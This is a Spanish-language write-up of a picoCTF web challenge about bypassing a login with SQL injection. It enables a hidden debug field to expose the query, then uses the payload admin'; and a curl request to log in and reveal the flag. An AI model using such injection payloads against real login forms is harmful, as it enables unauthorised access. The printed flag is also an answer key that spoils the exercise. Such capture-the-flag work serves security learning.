# Objetivo

Hay un sitio web en https://jupiter.challenges.picoctf.org/problem/53751/ (enlace). Alguien ha omitido el inicio de sesión antes y ahora se está fortaleciendo. ¡Intenta ver si aún puedes iniciar sesión! o http://jupiter.challenges.picoctf.org:53751
1. La contraseña se está filtrando.

## Solución

```
Causaremos un error de inyeccion, haciendo uso de unas comillas en laparte del usuario (").
Inspeccionamos el cuadro y vemos que el apartado donde ingresamos los datos de usuario y password, son identificados como username y password.
Tambien observamos que en el cuadro de Login, se pueden cambiar varios parametros, y ahi observamos que salen varios parametros que estaban ocultos con anterioridad:

<input type="hidden" name="debug" value="0">

--Este apartado lo cambiamos a 1 y nos aparecen los datos que se envian desde los cuadros de texto y ademas la consulta que se realiza en la abse de datos, la cual es:
SQL query: SELECT * FROM users WHERE name='usermane' AND password='password'
Entonces jugamos con esta consulta y con el usuario enviamos 
username: admin';
password: password
SQL query: SELECT * FROM users WHERE name='admin';' AND password='password'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_c34df170}
```

Si deseamos hacerlo desde consola, podemos hacer lo siguiente:
```
┌──(jesus㉿KaliJesus)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username=admin';&password=admin&debug=1"
<pre>username: admin';
password: admin
SQL query: SELECT * FROM users WHERE name='admin';' AND password='admin'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>                                                                                     
┌──(jesus㉿KaliJesus)-[~]
└─$ 
```
## Notas adicionales

- Usamos inyección SQL, tratando de burlar la consulta que hace la pagina a la base de datos.
- Esto lo pudimos realizar tanto en la pagina al momento de inspeccionar como en la terminal de nuestra maquina.

Usamos las siguientes instrucciones:
username: admin';
password: password
SQL query: SELECT * FROM users WHERE name='admin';' AND password='password'

## Referencias

https://github.com/payloadbox/sql-injection-payload-list